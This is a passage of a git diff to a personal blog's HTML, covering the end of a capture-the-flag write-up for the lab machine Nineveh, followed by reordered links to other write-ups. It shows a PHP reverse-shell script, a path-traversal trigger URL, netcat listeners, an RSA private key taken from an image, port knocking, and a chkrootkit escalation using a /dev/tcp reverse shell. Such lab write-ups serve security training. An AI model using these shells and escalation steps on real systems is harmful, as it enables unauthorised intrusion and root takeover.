class="mi">0</span><span class="p">);</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span> <span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div></p>
 
 <p>On our side, we set up our listener and then visit <a href="http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/somename.php" target="_blank">http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/somename.php</a></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60002
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc -lvp 60002
 nc: listening on 0.0.0.0 60002 ...
 nc: connect to 10.10.15.203 60002 from nineveh.htb (10.10.10.43) 36908 [36908]
 nc: using stream socket
@@ -573,7 +573,7 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 amrois   pts/0    10.10.15.203     08:53    4:05   0.08s  0.08s -bash
 amrois   pts/1    10.10.15.82      09:05   29.00s  0.04s  0.04s -bash
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@nineveh:/$</code></pre></div></div>
+www-data@nineveh:/$</code></pre></div>
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
@@ -582,7 +582,7 @@ www-data@nineveh:/$</code></pre></div></div>
 <p>If we visit <a href="https://nineveh.htb/secure_notes/" target="_blank">https://nineveh.htb/secure_notes/</a> we see a large image: <a href="https://nineveh.htb/secure_notes/nineveh.png" target="_blank">https://nineveh.htb/secure_notes/nineveh.png</a>
 If we download it and run</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ strings nineveh.png</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ strings nineveh.png</code></pre></div>
 
 <p>we discover, hidden inside the file, this private key:
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN RSA PRIVATE KEY-----
@@ -615,7 +615,7 @@ fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
 
 <p>Save the private key to a file and chmod 600 it.
 Now we have to do some port knocking in order to open SSH port 22. We can find this information and the correct port combination by reading either /etc/knockd.conf or /var/mail/amrois
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ls -al /etc/knockd.conf 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ls -al /etc/knockd.conf 
 -rw-r--r-- 1 root root 354 Aug  5 02:06 /etc/knockd.con
 
 $ cat knockd.conf
@@ -653,24 +653,24 @@ Subject: Another Important note!
 Message-Id: &lt;20170623190419.D289B2E3587@nineveh.htb&gt;
 Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
 
-Amrois! please knock the door next time! 571 290 911</code></pre></div></div></p>
+Amrois! please knock the door next time! 571 290 911</code></pre></div></p>
 
 <p>Therefore we can connect from outside like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">knock 10.10.10.43 571 290 911 &amp;&amp; ssh -i sshprivkey.txt amrois@10.10.10.43</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">knock 10.10.10.43 571 290 911 &amp;&amp; ssh -i sshprivkey.txt amrois@10.10.10.43</code></pre></div>
 OR you can connect from inside your shell like that:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i sshprivatekey.txt amrois@localhost</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i sshprivatekey.txt amrois@localhost</code></pre></div></p>
 
 <h2 id="root">Root</h2>
 
 <p>We see this interesting folder:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/$ ls -al /
+<div class="bg-black"><pre><code class="language-console" data-lang="console">amrois@nineveh:/$ ls -al /
 ...
 drwxr-xr-x   2 amrois amrois  4096 Dec 16 08:54 report
-...</code></pre></div></div>
+...</code></pre></div>
 
 <p>Inside this folder, we find some reports which are generated by chkrootkit:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/$ cd report/
+<div class="bg-black"><pre><code class="language-console" data-lang="console">amrois@nineveh:/$ cd report/
 amrois@nineveh:/report$ ls -al
 total 48
 drwxr-xr-x  2 amrois amrois 4096 Dec 17 05:54 .
@@ -682,46 +682,46 @@ drwxr-xr-x 24 root   root   4096 Jul  2 21:07 ..
 -rw-r--r--  1 amrois amrois 4807 Dec 17 05:54 report-17-12-17:05:54.txt
 
 amrois@nineveh:/report$ cat report-17-12-17:05:51.txt
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Let&rsquo;s search exploits for chkrootkit:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$searchsploit chkrootkit -w
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$searchsploit chkrootkit -w
 
 Chkrootkit - Local Priv Escalation (Metasploit) https://www.exploit-db.com/exploits/38775/
-Chkrootkit 0.49 - Local Privilege Escalation    https://www.exploit-db.com/exploits/33899/</code></pre></div></div></p>
+Chkrootkit 0.49 - Local Privilege Escalation    https://www.exploit-db.com/exploits/33899/</code></pre></div></p>
 
 <p>Nice! Chkrootkit before 0.50 will run any executable file named /tmp/update as root, allowing a trivial priv esc.
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nano /tmp/update
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nano /tmp/update
     #!/bin/bash
     bash -i &gt;&amp; /dev/tcp/10.10.15.203/60000 0&gt;&amp;1
-$ chmod +x /tmp/update</code></pre></div></div>
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60000
+$ chmod +x /tmp/update</code></pre></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc -lvp 60000
 nc: listening on 0.0.0.0 60000 ...
 nc: connect to 10.10.15.203 60000 from nineveh.htb (10.10.10.43) 60706 [60706]
 nc: using stream socket
 
-root@nineveh:~#</code></pre></div></div></p>
+root@nineveh:~#</code></pre></div></p>
 
 <p>Let&rsquo;s explore those cron jobs a little:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@nineveh:~# <span class="nb">cd</span> /var/spool/cron/crontabs
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@nineveh:~# cd /var/spool/cron/crontabs
 root@nineveh:/var/spool/cron/crontabs# ls -al
--rw------- <span class="m">1</span> amrois crontab <span class="m">1129</span> Jul  <span class="m">2</span> <span class="m">19</span>:59 amrois
--rw------- <span class="m">1</span> root   crontab <span class="m">1120</span> Jul  <span class="m">2</span> <span class="m">19</span>:59 root
+-rw------- 1 amrois crontab 1129 Jul  2 19:59 amrois
+-rw------- 1 root   crontab 1120 Jul  2 19:59 root
 
 root@nineveh:/var/spool/cron/crontabs# tail -n2 amrois
 */10 * * * * /usr/sbin/report-reset.sh
 
 root@nineveh:/var/spool/cron/crontabs# cat /usr/sbin/report-reset.sh
-<span class="cp">#!/bin/bash
-</span><span class="cp"></span>rm -rf /report/*.txt
+#!/bin/bash
+rm -rf /report/*.txt
 
 root@nineveh:/var/spool/cron/crontabs# tail -n2 root
 */1 * * * * /root/vulnScan.sh
 
 root@nineveh:/var/spool/cron/crontabs# cat /root/vulnScan.sh
-<span class="cp">#!/bin/bash
-</span><span class="cp"></span>/usr/bin/chkrootkit &gt; /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M<span class="sb">`</span>.txt
-chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M<span class="sb">`</span>.txt</code></pre></div></div></p>
+#!/bin/bash
+/usr/bin/chkrootkit &gt; /report/report-`date +%y-%m-%d:%H:%M`.txt
+chown amrois:amrois /report/report-`date +%y-%m-%d:%H:%M`.txt</code></pre></div></p>
 
 <p>That&rsquo;s all folks! :)</p>
 
@@ -748,6 +748,246 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -801,25 +1041,21 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -832,6 +1068,30 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nl80211/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
+      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Oct 2016</time>
+      <time lang="el">09 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -878,20 +1138,48 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -930,6 +1218,50 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
             <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
       <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
@@ -944,6 +1276,230 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1037,177 +1593,21 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1261,61 +1661,9 @@ chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nl80211/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
-      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Oct 2016</time>
-      <time lang="el">09 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
